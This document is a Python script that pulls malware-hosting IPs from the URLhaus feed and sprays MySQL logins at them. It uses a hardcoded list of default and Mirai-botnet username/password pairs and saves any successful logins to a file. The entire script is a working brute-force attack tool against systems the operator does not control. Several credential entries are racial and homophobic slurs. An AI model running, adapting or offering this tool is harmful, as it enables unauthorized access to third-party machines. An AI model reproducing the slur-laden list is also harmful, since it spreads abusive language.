import asyncio
import os
import socket

import aiofiles
import aiomysql
import httpx
from tqdm import tqdm

CREDENTIALS = [
    (".", "."),
    ("666666", "666666"),
    ("888888", "888888"),
    ("admin", ""),
    ("admin", "1111"),
    ("admin", "1111111"),
    ("admin", "1234"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("admin", "54321"),
    ("admin", "7ujMko0admin"),
    ("admin", "admin"),
    ("admin", "admin1234"),
    ("admin", "meinsm"),
    ("admin", "pass"),
    ("admin", "password"),
    ("admin", "smcadmin"),
    ("admin1", "password"),
    ("administrator", "1234"),
    ("Administrator", "admin"),
    ("botnet", "botnet"),
    ("botnet", "tutorial"),
    ("ddos", "ddos"),
    ("distract", "root"),
    ("fag", "fag"),
    ("faggot", "faggot"),
    ("gay", "gay"),
    ("guest", "12345"),
    ("guest", "guest"),
    ("ll", "ll"),
    ("mirai", "mirai"),
    ("mother", "fucker"),
    ("net", "net"),
    ("nigga", "nigga"),
    ("nigger", "nigger"),
    ("poo", "poo"),
    ("poop", "poop"),
    ("root", ""),
    ("root", "000000"),
    ("root", "1111"),
    ("root", "1234"),
    ("root", "12345"),
    ("root", "123456"),
    ("root", "54321"),
    ("root", "666666"),
    ("root", "7ujMko0admin"),
    ("root", "7ujMko0vizxv"),
    ("root", "888888"),
    ("root", "admin"),
    ("root", "anko"),
    ("root", "default"),
    ("root", "dreambox"),
    ("root", "hi3518"),
    ("root", "ikwb"),
    ("root", "jauntech"),
    ("root", "jvbzd"),
    ("root", "klv123"),
    ("root", "klv1234"),
    ("root", "pass"),
    ("root", "password"),
    ("root", "realtek"),
    ("root", "root"),
    ("root", "system"),
    ("root", "toor"),
    ("root", "user"),
    ("root", "vizxv"),
    ("root", "xc3511"),
    ("root", "xmhdipc"),
    ("root", "zlxx."),
    ("root", "Zte521"),
    ("service", "service"),
    ("SHOW", "SHOW"),
    ("skid", "bop"),
    ("skid", "skid"),
    ("Skid", "Skid"),
    ("spike", "spike"),
    ("Stress", "City"),
    ("supervisor", "supervisor"),
    ("support", "support"),
    ("tech", "tech"),
    ("test", "test"),
    ("ubnt", "ubnt"),
    ("udp", "udp"),
    ("user", "pass"),
    ("user", "password"),
    ("user", "user"),
    ("username", "password")
]

async def fetch_malicious_hosts(client: httpx.AsyncClient) -> set[str]:
    ENDPOINT = "https://urlhaus.abuse.ch/downloads/csv_recent"
    resp = (await client.get(ENDPOINT)).text
    hosts = set()
    for row in resp.splitlines():
        for tag in {"mirai", "arm", "mips"}:
            if tag in row.casefold():
                host = str(row.split(',')[2].split("://")[1].split('/')[0])
                if not (host.count('.') == 4) or not host.strip('.').isnumeric():
                    try:
                        host = socket.gethostbyname(host)
                    except:
                        continue
                hosts.add(host)
                break
    return hosts

async def spray_mysql(username: str, password: str, hosts: set[str], progress: tqdm) -> None:
    for host in hosts:
        try:
            progress.write(f"Attempting Credentials -> {username}:{password}@{host}")
            async with aiomysql.connect(host=host, user=username, password=password, connect_timeout=3):
                progress.update(1)
                progress.write(f"Authentication Successful -> {username}:{password}@{host}")
                async with aiofiles.open("./output.txt", "w+") as f:
                    await f.write(f"{username}:{password}@{host}\n")
                await f.close()
        except:
            progress.update(1)
            continue

async def core():
    if not os.path.exists("./output.txt"):
        await aiofiles.open("./output.txt", "w+")
    async with httpx.AsyncClient() as client:
        hosts = await fetch_malicious_hosts(client)
        with tqdm(total=(len(CREDENTIALS) * len(hosts))) as progress:
            await asyncio.gather(*[asyncio.ensure_future(spray_mysql(username, password, hosts, progress)) for username, password in CREDENTIALS], return_exceptions=False)

asyncio.run(core())
